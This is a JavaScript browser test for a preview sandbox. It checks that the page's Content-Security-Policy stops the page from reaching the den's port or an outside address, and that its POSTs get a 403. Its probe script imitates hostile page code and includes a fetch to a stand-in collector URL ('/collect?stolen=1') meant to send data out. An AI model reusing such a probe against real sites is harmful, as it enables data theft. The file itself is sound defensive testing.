// den-mvp/09 (ADR 0026 decision 5): what a preview's own page can do, in a real browser. The page here stands for
// candidate code nobody has reviewed: it tries to send what it can read to the den's port and to an outside address,
// and to change something through its own port.
import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { chromium } from "playwright";
import { buildLaunchOptions } from "../../ci-cd/launch-options.mjs";
import { startBridge } from "../server.mjs";
import { makeStateFixture } from "../bridge-fixture.mjs";
import { CODE } from "../bridge-auth-helpers.mjs";
import { openPreview } from "./preview.mjs";

const PROBE = `const violations = [];
document.addEventListener("securitypolicyviolation", (e) => violations.push({ uri: e.blockedURI, directive: e.effectiveDirective }));
const attempt = async (url, init) => {
  try {
    return { status: (await fetch(url, init)).status };
  } catch (err) {
    return { error: err.name };
  }
};
const json = (method) => ({ method, headers: { "Content-Type": "application/json" }, body: "{}" });
const q = new URLSearchParams(location.search);
window.__probe = {
  own: await attempt("/state"),
  den: await attempt(q.get("den") + "/state"),
  denPost: await attempt(q.get("den") + "/session", json("POST")),
  outside: await attempt(q.get("outside") + "/collect?stolen=1"),
  post: await attempt("/agents", json("POST")),
  session: await attempt("/session", json("POST")),
  violations,
};
`;

// Stands for an outside address. It allows any origin, so only the page's policy can be what stops a request to it.
const startOutside = () => new Promise((resolve) => {
  const hits = [];
  const server = http.createServer((req, res) => {
    hits.push(`${req.method} ${req.url}`);
    res.writeHead(200, { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*", "Content-Type": "text/plain" });
    res.end("taken");
  });
  server.listen(0, "127.0.0.1", () => resolve({ url: `http://127.0.0.1:${server.address().port}`, hits, close: () => new Promise((done) => server.close(done)) }));
});

test("a preview page cannot reach the den's port or an outside address, and its POST to its own port is a 403", { timeout: 90_000 }, async () => {
  let fx, tmp, bridge, preview, outside, browser;
  try {
    fx = await makeStateFixture();
    tmp = await mkdtemp(path.join(tmpdir(), "den-preview-browser-"));
    const dist = path.join(tmp, "apps/ui/dist");
    await mkdir(path.join(dist, "assets"), { recursive: true });
    await writeFile(path.join(dist, "index.html"), '<!doctype html><title>preview</title><script type="module" src="/assets/probe.js"></script>');
    await writeFile(path.join(dist, "assets", "probe.js"), PROBE);
    bridge = await startBridge({ root: fx.root, port: 0, uiDir: dist, auth: { launchCode: CODE } });
    preview = await openPreview({ id: "job-1", dir: tmp, reads: bridge.previewReads });
    outside = await startOutside();
    browser = await chromium.launch(buildLaunchOptions());
    const page = await browser.newPage();

    const url = new URL(preview.url);
    url.search = new URLSearchParams({ den: bridge.url, outside: outside.url }).toString();
    await page.goto(url.href);
    await page.waitForFunction(() => window.__probe);
    const probe = await page.evaluate(() => window.__probe);

    assert.deepEqual(probe.own, { status: 200 }, "the preview reads the live den through its own port");
    for (const name of ["den", "denPost", "outside"]) assert.deepEqual(probe[name], { error: "TypeError" }, `${name}: the fetch was stopped`);
    const blocked = probe.violations.filter((v) => v.directive === "connect-src").map((v) => v.uri);
    assert.equal(blocked.length, 3, "three connections were stopped by the policy");
    assert.ok(blocked.some((uri) => uri.startsWith(outside.url)), "the outside address was stopped by connect-src");
    assert.equal(blocked.filter((uri) => uri.startsWith(bridge.url)).length, 2, "the den's port was stopped by connect-src, for a read and for a POST");
    assert.deepEqual(outside.hits, [], "nothing reached the outside address");
    assert.deepEqual(probe.post, { status: 403 });
    assert.deepEqual(probe.session, { status: 403 });

    // The outside address does answer, and takes any origin: the policy is what stopped the page.
    const res = await fetch(`${outside.url}/control`, { headers: { Origin: url.origin } });
    assert.equal(res.headers.get("access-control-allow-origin"), "*");
    assert.deepEqual(outside.hits, ["GET /control"]);
  } finally {
    await browser?.close();
    await preview?.close();
    await bridge?.close();
    await outside?.close();
    await fx?.cleanup();
    if (tmp) await rm(tmp, { recursive: true, force: true });
  }
});
